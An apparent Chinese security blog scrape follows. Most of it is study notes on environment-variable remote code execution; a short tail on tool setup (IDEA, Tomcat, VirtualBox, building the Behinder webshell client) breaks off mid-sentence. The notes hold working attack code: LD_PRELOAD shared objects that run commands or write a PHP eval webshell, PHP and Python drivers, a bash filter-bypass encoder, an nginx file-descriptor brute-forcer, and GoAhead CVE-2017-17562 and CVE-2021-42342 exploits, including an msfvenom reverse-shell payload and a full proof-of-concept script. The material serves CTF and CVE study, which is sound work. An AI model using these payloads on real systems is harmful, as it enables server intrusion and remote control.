原理是利用mail触发sendmail，再触发getuid（已被我们的.so劫持），最后执行命令\npreload #define _GNU_SOURCE #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; extern char** environ; __attribute__ ((__constructor__)) void preload (void) { // get command line options and arg const char* cmdline = getenv(\u0026#34;EVIL_CMDLINE\u0026#34;); // unset environment variable LD_PRELOAD. // unsetenv(\u0026#34;LD_PRELOAD\u0026#34;) no effect on some // distribution (e.g., centos), I need crafty trick. int i; for (i = 0; environ[i]; ++i) { if (strstr(environ[i], \u0026#34;LD_PRELOAD\u0026#34;)) { environ[i][0] = \u0026#39;\\0\u0026#39;; } } // executive command system(cmdline); } $ gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc.so \u0026lt;?php echo \u0026#34;\u0026lt;p\u0026gt; \u0026lt;b\u0026gt;example\u0026lt;/b\u0026gt;: http://site.com/bypass_disablefunc.php?cmd=pwd\u0026amp;outpath=/tmp/xx\u0026amp;sopath=/var/www/bypass_disablefunc_x64.so \u0026lt;/p\u0026gt;\u0026#34;; $cmd = $_GET[\u0026#34;cmd\u0026#34;]; $out_path = $_GET[\u0026#34;outpath\u0026#34;]; $evil_cmdline = $cmd . \u0026#34; \u0026gt; \u0026#34; . $out_path . \u0026#34; 2\u0026gt;\u0026amp;1\u0026#34;; echo \u0026#34;\u0026lt;p\u0026gt; \u0026lt;b\u0026gt;cmdline\u0026lt;/b\u0026gt;: \u0026#34; . $evil_cmdline . \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; putenv(\u0026#34;EVIL_CMDLINE=\u0026#34; . $evil_cmdline); $so_path = $_GET[\u0026#34;sopath\u0026#34;]; putenv(\u0026#34;LD_PRELOAD=\u0026#34; . $so_path); mail(\u0026#34;\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;); echo \u0026#34;\u0026lt;p\u0026gt; \u0026lt;b\u0026gt;output\u0026lt;/b\u0026gt;: \u0026lt;br /\u0026gt;\u0026#34; . nl2br(file_get_contents($out_path)) . \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; unlink($out_path); ?\u0026gt; url/test.php?cmd=pwd\u0026amp;outpath=/tmp/xx\u0026amp;sopath=/var/www/html/test.so 这个属于格局打开，不局限于劫持某个函数，而是通过preload拦截启动进程\nin CTF [PlaidCTF 2021] wp\n[pbCTF 2021]Advancement wp | wp2 | HACKING WITH ENVIRONMENT VARIABLES Interesting environment variables to supply to scripting language interpreters\n是GoAhead框架，在route.txt中增加cgi路由\nroute uri=/cgi-bin handler=cgi route uri=/ redirect=/cgi-bin/date handler=redirect 以及/cgi-bin下的cgi脚本\n#!/usr/bin/env python3 from datetime import date print(\u0026#34;Content-Type: text/plain\u0026#34;) print() today = date.today() print(\u0026#34;Today\u0026#39;s date:\u0026#34;, today) 而由GoAhead的cve我们知道（但好像这个题在当时是day题 没有公开的cve-2021-42342 而这里用的就是这个），上传表单键值对可以写入环境变量中，我们选择在PYTHONWARNINGS环境变量引入其它模块，再通过antigravity模块对于browser环境变量启动响应的进程，配合perl+PERL5OPT环境变量进行rce（更多内容参见上面的文章\n$ curl -F \u0026#34;PYTHONWARNINGS=all:0:antigravity.x:0:0\u0026#34; -F \u0026#34;BROWSER=perlthanks\u0026#34; -F \u0026#39;PERL5OPT=-Mbase;print(system(\u0026#34;cat\u0026#34;.chr(0x20).\u0026#34;/flag\u0026#34;));exit;\u0026#39; http://advancement.chal.perfect.blue ————p牛在vulhub中给出的poc用的是LD_PRELOAD，但是由于这个题目的相关目录/etc/goahead/tmp是只读的，所以无法构造上传表单传.so\n[湖湘杯2021 线下]MultistageAgency wp1 | wp2\n有proxy和web两个web用户起的服务，server由root起\nproxy在内网的8080端口，主要提供返回Secretkey的功能\npackage main import ( \u0026#34;github.com/elazarl/goproxy\u0026#34; \u0026#34;io/ioutil\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;os\u0026#34; ) func main() { file, err := os.Open(\u0026#34;secret/key\u0026#34;) // 读取当前目录下的key if err != nil { panic(err) } defer file.Close() content, err := ioutil.ReadAll(file) SecretKey := string(content) proxy := goproxy.NewProxyHttpServer() proxy.Verbose = true proxy.OnRequest().DoFunc( func(r *http.Request,ctx *goproxy.ProxyCtx)(*http.Request,*http.Response) { r.Header.Set(\u0026#34;Secretkey\u0026#34;,SecretKey) // 返回包的请求头设置Secretkey return r,nil }) log.Print(\u0026#34;start listen 8080\u0026#34;) log.Fatal(http.ListenAndServe(\u0026#34;:8080\u0026#34;, proxy)) } 9091端口server，有命令注入点/manage和一个waf，并且需要本地ip访问\npackage main import ( \u0026#34;bytes\u0026#34; \u0026#34;crypto/md5\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;io/ioutil\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;os\u0026#34; \u0026#34;os/exec\u0026#34; \u0026#34;unicode\u0026#34; ) // 检查来源ip为本地才继续执行 var SecretKey = \u0026#34;\u0026#34; func getToken(w http.ResponseWriter, r *http.Request) { header := r.Header token := \u0026#34;error\u0026#34; var sks []string = header[\u0026#34;Secretkey\u0026#34;] sk := \u0026#34;\u0026#34; if len(sks) == 1 { sk = sks[0] } var fromHosts []string = header[\u0026#34;Fromhost\u0026#34;] fromHost := \u0026#34;\u0026#34; if len(fromHosts) == 1 { fromHost = fromHosts[0] } if fromHost != \u0026#34;\u0026#34; \u0026amp;\u0026amp; sk != \u0026#34;\u0026#34; \u0026amp;\u0026amp; sk == SecretKey { data := []byte(sk + fromHost) has := md5.Sum(data) token = fmt.Sprintf(\u0026#34;%x\u0026#34;, has) } fmt.Fprintf(w, token) } func manage(w http.ResponseWriter, r *http.Request) { values := r.URL.Query() m := values.Get(\u0026#34;m\u0026#34;)\t// get方式传入m参数 if !waf(m) { fmt.Fprintf(w, \u0026#34;waf!\u0026#34;) return } cmd := fmt.Sprintf(\u0026#34;rm -rf uploads/%s\u0026#34;, m)\t// 删除uploads/{m}下所有内容 fmt.Println(cmd) command := exec.Command(\u0026#34;bash\u0026#34;, \u0026#34;-c\u0026#34;, cmd)\t// 命令注入点 outinfo := bytes.Buffer{} outerr := bytes.Buffer{} command.Stdout = \u0026amp;outinfo command.Stderr = \u0026amp;outerr err := command.Start() res := \u0026#34;ERROR\u0026#34; if err != nil { fmt.Println(err.Error()) } if err = command.Wait(); err != nil { res = outerr.String() } else { res = outinfo.String() } fmt.Fprintf(w, res) } func waf(c string) bool { var t int32 t = 0 blacklist := []string{\u0026#34;.\u0026#34;, \u0026#34;*\u0026#34;, \u0026#34;?\u0026#34;}\t// 黑名单 for _, s := range c { for _, b := range blacklist { if b == string(s) { return false } } if unicode.IsLetter(s) {\t// 是否为字母 if t == s { continue\t// 如果下一个字符ascii==上一个字符 则继续 } if t == 0 { t = s } else { return false } } } return true } func main() { file, err := os.Open(\u0026#34;secret/key\u0026#34;) if err != nil { panic(err) } defer file.Close() content, err := ioutil.ReadAll(file) SecretKey = string(content) http.HandleFunc(\u0026#34;/\u0026#34;, getToken) http.HandleFunc(\u0026#34;/manage\u0026#34;, manage) log.Print(\u0026#34;start listen 9091\u0026#34;) err = http.ListenAndServe(\u0026#34;:9091\u0026#34;, nil) // 监听端口 9091 if err != nil { log.Fatal(\u0026#34;ListenAndServe: \u0026#34;, err) } } web服务，对外访问\npackage main import ( \u0026#34;bytes\u0026#34; \u0026#34;crypto/md5\u0026#34; \u0026#34;encoding/json\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;io\u0026#34; \u0026#34;io/ioutil\u0026#34; \u0026#34;log\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;os\u0026#34; \u0026#34;os/exec\u0026#34; \u0026#34;path/filepath\u0026#34; \u0026#34;strings\u0026#34; ) var SecretKey = \u0026#34;\u0026#34; type TokenResult struct { Success string json:\u0026#34;success\u0026#34; Failed string json:\u0026#34;failed\u0026#34; } const letterBytes = \u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\u0026#34; func RandStringBytes(n int) string { b := make([]byte, n) for i := range b { b[i] = letterBytes[rand.Intn(len(letterBytes))] } return string(b) } func getToken(w http.ResponseWriter, r *http.Request) { values := r.URL.Query() fromHostList := strings.Split(r.RemoteAddr, \u0026#34;:\u0026#34;) // 获取来源ip fromHost := \u0026#34;\u0026#34; if len(fromHostList) == 2 { fromHost = fromHostList[0] } r.Header.Set(\u0026#34;Fromhost\u0026#34;, fromHost) command := exec.Command(\u0026#34;curl\u0026#34;, \u0026#34;-H\u0026#34;, \u0026#34;Fromhost: \u0026#34;+fromHost, \u0026#34;127.0.0.1:9091\u0026#34;)\t// 本地curl访问9091 for k, _ := range values { command.Env = append(command.Env, fmt.Sprintf(\u0026#34;%s=%s\u0026#34;, k, values.Get(k))) //获取环境变量 将参数键值对形式设为环境变量 } outinfo := bytes.Buffer{} outerr := bytes.Buffer{} command.Stdout = \u0026amp;outinfo command.Stderr = \u0026amp;outerr err := command.Start() // res := \u0026#34;ERROR\u0026#34; if err != nil { fmt.Println(err.Error()) } res := TokenResult{} if err = command.Wait(); err != nil { res.Failed = outerr.String() } res.Success = outinfo.String() msg, _ := json.Marshal(res) w.Write(msg) } type ListFileResult struct { Files []string json:\u0026#34;files\u0026#34; } // 查看当前 token 下的文件 func listFile(w http.ResponseWriter, r *http.Request) { values := r.URL.Query() token := values.Get(\u0026#34;token\u0026#34;) fromHostList := strings.Split(r.RemoteAddr, \u0026#34;:\u0026#34;) fromHost := \u0026#34;\u0026#34; if len(fromHostList) == 2 { fromHost = fromHostList[0] } // 验证token if token != \u0026#34;\u0026#34; \u0026amp;\u0026amp; checkToken(token, fromHost) { dir := filepath.Join(\u0026#34;uploads\u0026#34;,token) // 带着token获取已经上传的文件 files, err := ioutil.ReadDir(dir) if err == nil { var fs []string for _, f := range files { fs = append(fs, f.Name()) } msg, _ := json.Marshal(ListFileResult{Files: fs}) w.Write(msg) } } } type UploadFileResult struct { Code string json:\u0026#34;code\u0026#34; } func uploadFile(w http.ResponseWriter, r *http.Request) { if r.Method == \u0026#34;GET\u0026#34; { fmt.Fprintf(w, \u0026#34;get\u0026#34;) } else { values := r.URL.Query() token := values.Get(\u0026#34;token\u0026#34;)\t// get方式传入token参数 fromHostList := strings.Split(r.RemoteAddr, \u0026#34;:\u0026#34;) fromHost := \u0026#34;\u0026#34; if len(fromHostList) == 2 { fromHost = fromHostList[0] } // 验证token if token != \u0026#34;\u0026#34; \u0026amp;\u0026amp; checkToken(token, fromHost) { dir := filepath.Join(\u0026#34;uploads\u0026#34;,token) // 将获取到的token新建文件夹 if _, err := os.Stat(dir); err != nil { os.MkdirAll(dir, 0766) } files, err := ioutil.ReadDir(dir) if len(files) \u0026gt; 5 { command := exec.Command(\u0026#34;curl\u0026#34;, \u0026#34;127.0.0.1:9091/manage\u0026#34;) // 如果文件大于五个 则本地访问9091/manage删除所有文件 command.Start() } r.ParseMultipartForm(32 \u0026lt;\u0026lt; 20) file, _, err := r.FormFile(\u0026#34;file\u0026#34;) if err != nil { msg, _ := json.Marshal(UploadFileResult{Code: err.Error()}) w.Write(msg) return } defer file.Close() fileName := RandStringBytes(5) f, err := os.OpenFile(filepath.Join(dir, fileName), os.O_WRONLY|os.O_CREATE, 0666) if err != nil { fmt.Println(err) return } defer f.Close() io.Copy(f, file) msg, _ := json.Marshal(UploadFileResult{Code: fileName}) w.Write(msg) } else { msg, _ := json.Marshal(UploadFileResult{Code: \u0026#34;ERROR TOKEN\u0026#34;}) w.Write(msg) } } } func checkToken(token, ip string) bool { data := []byte(SecretKey + ip) has := md5.Sum(data) md5str := fmt.Sprintf(\u0026#34;%x\u0026#34;, has) return md5str == token } func IndexHandler (w http.ResponseWriter, r *http.Request) { http.ServeFile(w, r,\u0026#34;dist/index.html\u0026#34;) } func main() { file, err := os.Open(\u0026#34;secret/key\u0026#34;)\t// 读secret/key if err != nil { panic(err) } defer file.Close() content, err := ioutil.ReadAll(file) SecretKey = string(content) http.HandleFunc(\u0026#34;/\u0026#34;, IndexHandler) fs := http.FileServer(http.Dir(\u0026#34;dist/static\u0026#34;)) http.Handle(\u0026#34;/static/\u0026#34;, http.StripPrefix(\u0026#34;/static/\u0026#34;, fs)) http.HandleFunc(\u0026#34;/token\u0026#34;, getToken) http.HandleFunc(\u0026#34;/upload\u0026#34;, uploadFile) http.HandleFunc(\u0026#34;/list\u0026#34;, listFile) log.Print(\u0026#34;start listen 9090\u0026#34;) err = http.ListenAndServe(\u0026#34;:9090\u0026#34;, nil) if err != nil { log.Fatal(\u0026#34;ListenAndServe: \u0026#34;, err) } } 所以我们需要SSRF访问9091端口的/manage 并且绕waf进行命令注入读flag\n注意到web服务的/token路由可以设置环境变量，我们自然想到利用LD_PRELOAD和恶意.so来劫持系统函数进行rce\n传文件，通过web的/token?http_proxy=http://127.0.0.1:8080可以获得当前token（即上传目录\n之后上传恶意.so\n#include\u0026lt;stdlib.h\u0026gt; __attribute__((constructor)) void l3yx(){ unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); system(getenv(\u0026#34;_evilcmd\u0026#34;)); } $ gcc -shared -fPIC e.c -o e.so 在/token?LD_PRELOAD=/code/uploads/{token}\u0026amp;_evilcmd=ls%20-l%20/\u0026amp;http_proxy=127.0.0.1:8080下进行注入，成功rce\n之后弹个shell\n最后，对于waf，用这个（之前也见过\nn = dict() n[0] = \u0026#39;0\u0026#39; n[1] = \u0026#39;${##}\u0026#39; n[2] = \u0026#39;$((${##}\u0026lt;\u0026lt;${##}))\u0026#39; n[3] = \u0026#39;$(($((${##}\u0026lt;\u0026lt;${##}))#${##}${##}))\u0026#39; n[4] = \u0026#39;$((${##}\u0026lt;\u0026lt;$((${##}\u0026lt;\u0026lt;${##}))))\u0026#39; n[5] = \u0026#39;$(($((${##}\u0026lt;\u0026lt;${##}))#${##}0${##}))\u0026#39; n[6] = \u0026#39;$(($((${##}\u0026lt;\u0026lt;${##}))#${##}${##}0))\u0026#39; n[7] = \u0026#39;$(($((${##}\u0026lt;\u0026lt;${##}))#${##}${##}${##}))\u0026#39; f=\u0026#39;\u0026#39; def str_to_oct(cmd): s = \u0026#34;\u0026#34; for t in cmd: o = (\u0026#39;%s\u0026#39; % (oct(ord(t))))[2:] s+=\u0026#39;\\\\\u0026#39;+o return s def build(cmd): payload = \u0026#34;$0\u0026lt;\u0026lt;\u0026lt;$0\\\u0026lt;\\\u0026lt;\\\u0026lt;\\$\\\\\\\u0026#39;\u0026#34; s = str_to_oct(cmd).split(\u0026#39;\\\\\u0026#39;) for _ in s[1:]: payload+=\u0026#34;\\\\\\\\\u0026#34; for i in _: payload+=n[int(i)] return payload+\u0026#39;\\\\\\\u0026#39;\u0026#39; print(build(\u0026#39;cat /flag\u0026#39;)) curl \u0026quot;http://localhost:9091/manage?m=%3b{urlencode(payload)}\u0026quot;\n[虎符CTF 2022]ezphp wp\n\u0026lt;?php (empty($_GET[\u0026#34;env\u0026#34;])) ? highlight_file(__FILE__) : putenv($_GET[\u0026#34;env\u0026#34;]) \u0026amp;\u0026amp; system(\u0026#39;echo hfctf2022\u0026#39;);?\u0026gt; oneline php，看到这个putenv再结合前面的栗子应该不陌生了就，结合Nginx上传临时文件 传.so\n#define _GNU_SOURCE #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; __attribute__ ((__constructor__)) void preload (void){ system(\u0026#34;echo \\\u0026#34;\u0026lt;?php eval(\\\\$_POST[cmd]);?\u0026gt;\\\u0026#34; \u0026gt; /var/www/html/ame.php\u0026#34;); } $ gcc -fPIC -shared evil.c -o evil.so import threading, requests URL2 = f\u0026#39;http://127.0.0.1:30002/index.php\u0026#39; nginx_workers = [12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27] done = False def uploader(): print(\u0026#39;[+] starting uploader\u0026#39;) with open(\u0026#34;exp.so\u0026#34;,\u0026#34;rb\u0026#34;) as f: data = f.read() while not done: requests.get(URL2, data=data) for _ in range(16): t = threading.Thread(target=uploader) t.start() def bruter(pid): global done while not done: print(f\u0026#39;[+] brute loop restarted: {pid}\u0026#39;) for fd in range(4, 32): try: requests.get(URL2, params={ \u0026#39;env\u0026#39;: f\u0026#34;LD_PRELOAD=/proc/{pid}/fd/{fd}\u0026#34; }) except: pass for pid in nginx_workers: a = threading.Thread(target=bruter, args=(pid, )) a.start() Real World GoAhead / CVE-2017-17562 GoAhead: 2.5 ~ 3.6.5\n复现 - vulhub | REMOTE LD_PRELOAD EXPLOITATION GoAhead: Make My Day\nGoAhead可以运行asp，js和标准的CGI程序，漏洞发生在运行CGI程序时\n在收到请求后会从url参数中取出键值对并注册进CGI程序的环境变量，且只过滤了REMOTE_HOST和HTTP_AUTHORIZATION，而Linux下LD_开头的环境变量和动态链接库有关，比如LD_PRELOAD指定的动态链接库会自动加载，LD_LIBRARY_PATH指定的路径，程序会去其中寻找动态链接库\n我们可以指定LD_PRELOAD=/proc/self/fd/0，因为/proc/self/fd/0是标准输入，而CGI程序中，POST数据流即为标准输入流，我们发送.so给http://target/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0，CGI就会加载我们发送的动态链接库，造成RCE\n测试一个hello world的.so\n#include \u0026lt;unistd.h\u0026gt; static void before_main(void) __attribute__((constructor)); static void before_main(void){ write(1, \u0026#34;Hello: World!\\n\u0026#34;, 14); } $ gcc -shared -fPIC hello.c -o hello.so $ curl -X POST --data-binary @hello.so \u0026#34;url/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0\u0026#34; -i 成功作为响应头输出；尝试反弹shell\n$ msfvenom -a x64 --platform Linux -p linux/x64/shell_reverse_tcp lhost=192.168.31.29 lport=8426 -f elf-so -o p.so $ curl -X POST --data-binary @p.so \u0026#34;http://192.168.31.214:8080/cgi-bin/index?LD_PRELOAD=/proc/self/fd/0\u0026#34; -i GoAhead / CVE-2021-42342 复现 - vulhub | GoAhead环境变量注入复现踩坑记\n新的洞是对之前的一次绕过，补丁对用户传入参数进行了黑名单过滤，LD_PRELOAD这类参数不再设置为环境变量，但由于这个限制使用错了函数，导致实际上并没有生效；补丁还将用户传入的参数名前面增加了前缀，导致无法劫持任意环境变量，但这个限制漏掉了multipart的POST包，所以攻击者通过这个方式仍然可以注入任意环境变量\n注意，新版本的GoAhead默认没有开启CGI，而老版本如果没有cgi-bin目录，或者里面没有cgi文件，也不受这个漏洞影响\n旧的洞是通过设置LD_PRELOAD=/proc/self/fd/0 同时将恶意.so作为body传入，做到rce的效果，而这里我们需要在body中发送，所以我们选择提前在服务器上上传.so，之后再把LD_PRELOAD设置为这个文件的路径\n与PHP一样，GoAhead在遇到上传内容时会存在临时文件，不过这里的坑在于临时文件的目录配置\n#ifndef ME_GOAHEAD_UPLOAD_DIR #define ME_GOAHEAD_UPLOAD_DIR \u0026#34;tmp\u0026#34; #endif PUBLIC void websUploadOpen(void) { uploadDir = ME_GOAHEAD_UPLOAD_DIR; if (*uploadDir == \u0026#39;\\0\u0026#39;) { #if ME_WIN_LIKE uploadDir = getenv(\u0026#34;TEMP\u0026#34;); #else uploadDir = \u0026#34;/tmp\u0026#34;; #endif } trace(4, \u0026#34;Upload directory is %s\u0026#34;, uploadDir); websDefineHandler(\u0026#34;upload\u0026#34;, 0, uploadHandler, 0, 0); } 如果宏ME_GOAHEAD_UPLOAD_DIR没有定义，则uploadDir=/tmp，而这个宏一定不为空，所以直接就是tmp，这个相对目录取决于pwd，而pwd是GoAhead启动时--home参数指定的，是存放配置文件的目录\n如果--home /etc/goahead，那临时文件默认在/etc/goahead/tmp，如果这个目录不存在或者不可写，那么就会出现上传时500，一旦目标没有正常配置这个目录，就无法攻击（或者参见pbCTF2021 advancement的wp，使用python\n这里直接修改Dockerfile来指定临时文件目录\nmake SHOW=1 ME_GOAHEAD_UPLOAD_DIR=\u0026#34;\u0026#39;\\\u0026#34;/tmp\\\u0026#34;\u0026#39;\u0026#34; 尝试hello world\n#include \u0026lt;unistd.h\u0026gt; static void before_main(void) __attribute__((constructor)); static void before_main(void) { write(1, \u0026#34;Hello: World\\r\\n\\r\\n\u0026#34;, 16); write(1, \u0026#34;Hacked\\n\u0026#34;, 7); } $ gcc -shared -fPIC hello.c -o hello.so $ curl -v -F data=@hello.so -F \u0026#34;LD_PRELOAD=/proc/self/fd/7\u0026#34; \u0026#34;url/cgi-bin/test\u0026#34; -i 查看日志报Too big错误\n#ifndef ME_GOAHEAD_LIMIT_POST #define ME_GOAHEAD_LIMIT_POST 16384 #endif 最大16384字节，我们在gcc时增加-s参数来减小体积\n$ gcc -s -shared -fPIC hello.c -o hello.so $ curl -v -F data=@hello.so -F \u0026#34;LD_PRELOAD=/proc/self/fd/7\u0026#34; \u0026#34;http://192.168.31.214:8080/cgi-bin/test\u0026#34; 结果报404，fd/n这样的文件描述符对应的内容都无法打开，p牛猜测的可能是：CGI执行到这里时，被打开的临时文件描述符已经关闭，所以无法打开\n照这样的推测，我们可以想到条件竞争，一个上传一个包含，或者是给.so文件后增加脏字符 但是CL头的长度小于最终数据包的大小，这样GoAhead读取数据包的时候能够完全读取到payload.so的内容，但实际这个文件并没有上传完毕\n首先构造好之前那个无法利用的数据包，其中第一个表单字段是LD_PRELOAD，值是文件描述符，一般是/proc/self/fd/7，之后对之前的数据包.so末尾增加几千个字节的脏字符，比如说a，之后将数据包的CL设置为不超过16384的值，但比payload.so文件的大小要大个500字节左右\n由于上传流程没有结束，所以此时文件描述符是没有关闭的，可以通过/proc/self/fd/7读取到，脏字符也不影响动态链接库的加载和运行，最后即可成功完成劫持\np牛已经写好了脚本\nimport sys import socket import ssl import random from urllib.parse import urlparse, ParseResult PAYLOAD_MAX_LENGTH = 16384 - 200 def exploit(client, parts: ParseResult, payload: bytes): path = \u0026#39;/\u0026#39; if not parts.path else parts.path boundary = \u0026#39;----%s\u0026#39; % str(random.randint(1000000000000, 9999999999999)) padding = \u0026#39;a\u0026#39; * 2000 content_length = min(len(payload) + 500, PAYLOAD_MAX_LENGTH) data = fr\u0026#39;\u0026#39;\u0026#39;POST {path} HTTP/1.1 Host: {parts.hostname} Accept-Encoding: gzip, deflate Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Connection: close Content-Type: multipart/form-data; boundary={boundary} Content-Length: {content_length} --{boundary} Content-Disposition: form-data; name=\u0026#34;LD_PRELOAD\u0026#34;; /proc/self/fd/7 --{boundary} Content-Disposition: form-data; name=\u0026#34;data\u0026#34;; filename=\u0026#34;1.txt\u0026#34; Content-Type: text/plain #payload#{padding} --{boundary}-- \u0026#39;\u0026#39;\u0026#39;.replace(\u0026#39;\\n\u0026#39;, \u0026#39;\\r\\n\u0026#39;) data = data.encode().replace(b\u0026#39;#payload#\u0026#39;, payload) client.send(data) resp = client.recv(20480) print(resp.decode()) def main(): target = sys.argv[1] payload_filename = sys.argv[2] with open(payload_filename, \u0026#39;rb\u0026#39;) as f: data = f.read() if len(data) \u0026gt; PAYLOAD_MAX_LENGTH: raise Exception(\u0026#39;payload size must not larger than %d\u0026#39;, PAYLOAD_MAX_LENGTH) parts = urlparse(target) port = parts.port if not parts.port: if parts.scheme == \u0026#39;https\u0026#39;: port = 443 else: port = 80 context = ssl.create_default_context() with socket.create_connection((parts.hostname, port), timeout=8) as client: if parts.scheme == \u0026#39;https\u0026#39;: with context.wrap_socket(client, server_hostname=parts.hostname) as ssock: exploit(ssock, parts, data) else: exploit(client, parts, data) if __name__ == \u0026#39;__main__\u0026#39;: main() $ python3 poc.py http://target-ip:8080/cgi-bin/index /path/to/payload.so 成功劫持\n————由于最近也学习了CL\u0026amp;TE头的相关内容，再看到这里的实现细节感觉还挺亲切的（说明自己学的实在太少了（\n是学习笔记，有很多疏漏还请谅解（\n一直不开学，在家几个月多少有点懈怠，但是时间不等人啊，不要荒废了自己\n","date":"2022-03-23T18:33:39+08:00","permalink":"https://amiaaaz.github.io/2022/03/23/smth-about-env-variables/","section":"posts","tags":["环境变量","RCE"],"title":"环境变量相关问题"},{"categories":["LTS","环境配置"],"contents":" 本地搭建Visual Regexp 搭建原因大家应该都懂吧，一个是正则可视化实在是很香很必要，其次线下没网的话没有个离线工具就很容易gg，同类工具还有cyberchef等\nVisual Regexp在线地址 | github仓库\n在git clone之后首先肯定是npm install，出现vulnerabilities很正常，直接npm audit fix --force，一次不行就两次\n奇葩的是作者自己的visual-regex包一直是以快捷方式的形式被安装（后来发现是整个项目的package.json编写的问题）\n解决方法：删除快捷方式，单独安装npm i visual-regex，用everything查找到该包具体存在的位置，复制到node_modules目录下\n之后到build目录下node .\\build.js\n报错hightlight.js并没有引入./lib/highlight，查看\\highlight.js\\package.json的exports部分，发现第90行的引用是\u0026quot;.\u0026quot;，将其改为\u0026quot;./lib/highlight\u0026quot;\n再次build提示*\u0026lsquo;NODE_ENV\u0026rsquo; is not recognized as an internal or external command, operable program or batch file.*（此处截图走丢了），解决方法npm install -g win-node-env\n之后node .\\build.js即可成功build，在devlist文件夹下的index.html即可正常使用相关功能\n无法打开jar包应用 这个应该属于常见问题了，一般原因是java版本不对\n很多人选择设置不同名字的环境变量，比如java8，java11，我的话是只有java11是环境变量，在有些jar需要java8的环境时直接用everything搜索java.exe，复制路径之后xxx\\java.exe -jar xyz.jar这样来运行\n远程调试Node.js 场景：用vulhub或其它已经打包好的docker环境复现cve需要远程调试\n首先修改对应的docker文件：package.json的\u0026quot;scripts\u0026quot;字段的\u0026quot;start\u0026quot;部分增加--inspect=0.0.0.0:port，指名调试时的监听端口\ndocker-compose.yml中增加监听端口\u0026quot;8000:9229\u0026quot;，之后正常docker-compose up -d\n本地先下载好一样的文件，用vscode生成一个调试文档lauch.json\n需要改的配置有address（远程ip），port（远程监听端口），localRoot（本地路径），remote（远程路径），之后即可打断点调试\n出现unbound breakpoint正常，大概率是你的交互就没执行到打断点的地方，所以没什么反应\nVirtualBox给虚拟机磁盘扩容 当初给kali只分配了16G（无奈啊，谁让我主机也就512，得省着用），导致今天pip一个包都失败\n之后我直接用自带的主机介质管理器增加盘片的大小\n当我把下面显示大小的条滑到24G的时候我觉得稳了，这还能不够用？？？于是自信开机\n笑死，GParted没识别出来，df -h也完全没变化，我就又多分配了4G，结果裂开，还是没识别\n然后我发现问题在于快照的存储是单独有一个uuid的vdi的，而扩容时我选择在最上层的kali.vdi扩容，导致不会同步到下面的快照的存储信息\n解决方法就是把前面所有的快照删除掉，之后再开机就可以识别了\n由于未分配和/dev/sda1之间隔着扩展分区和swap，所以先删除这两个，扩容后再新建加回来\n应用修改之后自信开机，发现怎么kali的龙半天都不蓝…… 一番排错，之后发现是因为swap分区的uuid发生改变导致swap没有正常挂载（swapon --show回显为空）\n输入blkid复制/dev/sda5的uuid，将其复制粘贴到/etc/fstab的对应位置，就好啦\nusage of api documented as @since xxx idea-\u0026gt;Project Structure-\u0026gt;Project Settings-\u0026gt;Language level\ntomcat\u0026amp;部署war包 傻逼Java，总是一堆问题\n首先是打war包，用Maven\n将会导出war到target目录下，将它复制到tomcat/webapps目录下，启动，结果直接来了404\norg.apache.catalina.core.StandardContext.startInternal 一个或多个listeners启动失败，更多详细信息查看对应的容器日志文件 在tomcat下的logs目录查看localhost.year-month-day.log，发现详细报错为org.apache.catalina.core.StandardContext.listenerStart 配置应用程序监听器[org.apache.shiro.web.env.EnvironmentLoaderListener]错误\n于是考虑是打包时没有带上依赖，查看war打包时的lib文件夹发现都不缺\n再回看完整报错，在最后有Caused by: java.lang.ClassNotFoundException: javax.servlet.ServletContextListener，发现问题和我们打包无关 而是tomcat版本的问题\n通过下载tomcat9版本来解决报错，此处是下载链接，直接解压\n./bin/catalina.sh run # 用这个命令为了让简短报错直接打印在console idea远程调试java web项目(jar/tomcat) java -jar方式启动 以复现CVE-2020-13933为例，这里java项目直接-jar即可启动，无需依赖tomcat作web服务器\ndocker pull jackey0/cve-2020-11989 docker cp \u0026lt;container-id\u0026gt;:/springboot-shiro-0.0.1-SNAPSHOT.jar /home/name/t3mp/ # 8426对外web端口, 8001对外调试端口 docker run -p 8426:8080 -p 8001:1456 \u0026lt;image-id\u0026gt; /bin/sh -c \u0026#39;java -jar -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=1456 /springboot-shiro-0.0.1-SNAPSHOT.jar\u0026#39; 此处添加参数与docker的相同\ntomcat加载war包方式 编辑tomcat目录下./bin/catalina.sh，搜索JPDA_ADDRESS，修改\nJPDA_ADDRESS=\u0026#34;0.0.0.0:8000\u0026#34; 然后idea设置与上面相同，tomcat启动\n./catalina.sh jpda run idea的远程看着花哨，有一堆设置可以选，但是那个看起来方便的tomcat remote server调试实际远不如这样，垃圾\n之后打断点调试即可，熟练掌握右键-\u0026gt;add as a library的方式调试核心jar\nidea打jar包（非maven） maven的话相当简单，直接用右侧maven工具栏即可完成build\n非maven下，以通达OA综合利用工具为例\n注意到根目录下就有.idea文件夹，但是直接idea打开并build并不会得到编译好的jar，排错后发现manifest file指定的com.xxx主类有问题，是项目的module没有设置好\n需要在这里设置Content Root，这样才可以在Artifacts处正确读取到Manifest File（不然是不正常的），并且module sdk也要设置好（不然为空）\n之后勾选Include in project build，再build就正常了\nidea打jar包（maven） 以冰蝎3.0.11为例，下载github上已经反编译好的源码（感谢带佬的反编译）\ngit clone https://github.com/MountCloud/BehinderClientSource.git idea打开，首先把项目sdk之类的改成jdk8，然后就是排错之路：\npom.xml的com.sun的systemPath改为绝对路径 